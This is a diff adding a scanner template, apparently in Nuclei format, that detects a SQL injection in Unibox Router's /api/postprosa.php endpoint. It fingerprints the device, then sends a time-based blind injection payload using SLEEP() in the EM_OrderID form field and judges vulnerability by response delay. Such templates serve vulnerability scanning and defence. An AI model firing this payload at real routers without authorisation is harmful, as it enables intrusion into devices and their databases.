@@ -1,0 +1,51 @@
+id: poc-yaml-unibox-router-postprosa-php-sqli
+info:
+  name: Unibox Router postprosa.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: unibox_administration
+
+variables:
+  t1: "{{rand_int(1, 4)}}"
+  t2: "{{to_number(t1) + to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Unibox"
+        part: body
+
+  - raw:
+      - |
+        POST /api/postprosa.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        EM_Digest=11&EM_Response=approved&EM_OrderID=1' AND (SELECT 1337 FROM (SELECT(SLEEP({{t1}})))xasd)-- -
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2)"
+          - "duration < to_number(t3)"
